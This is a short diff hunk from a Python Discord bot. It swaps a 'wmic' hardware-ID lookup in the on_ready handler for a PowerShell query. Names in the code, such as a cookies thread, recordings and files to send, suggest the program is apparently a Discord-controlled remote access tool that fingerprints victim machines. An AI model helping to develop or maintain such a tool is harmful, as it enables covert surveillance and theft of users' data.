@@ -125,7 +125,7 @@ working_directory = ['C:', 'Users', getuser(), software_directory_name]
 async def on_ready():
     global force_to_send, messages_to_send, files_to_send, embeds_to_send, channel_ids, cookies_thread, latest_messages_in_recordings
     #.log BOT loaded
-    hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
+    hwid = subprocess.check_output("powershell (Get-CimInstance Win32_ComputerSystemProduct).UUID").decode().strip()
     #.log HWID obtained
     first_run = True
     for category_name in client.get_guild(guild_id).categories:
